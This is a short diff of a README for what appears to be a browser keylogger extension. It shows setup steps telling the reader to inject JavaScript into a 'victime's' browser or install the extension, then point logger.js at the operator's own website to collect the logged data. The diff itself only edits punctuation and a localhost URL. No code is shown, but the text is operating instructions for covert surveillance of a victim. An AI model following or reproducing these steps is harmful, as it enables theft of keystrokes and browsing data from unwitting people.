@@ -57,9 +57,9 @@ if you want to change DATETIMEZONE clique here https://www.php.net/manual/en/tim
 
 inject javascript code into web browser of victime or use extension chrome or mozilla firefox
 
-Open the extension folder ,js/
+Open the extension folder js/
 + logger.js
-put the name of your website for exemple `http://127.0.0.1/server/ 
+put the name of your website for exemple `http://127.0.0.1
 and save changes
 
 + `background.js`
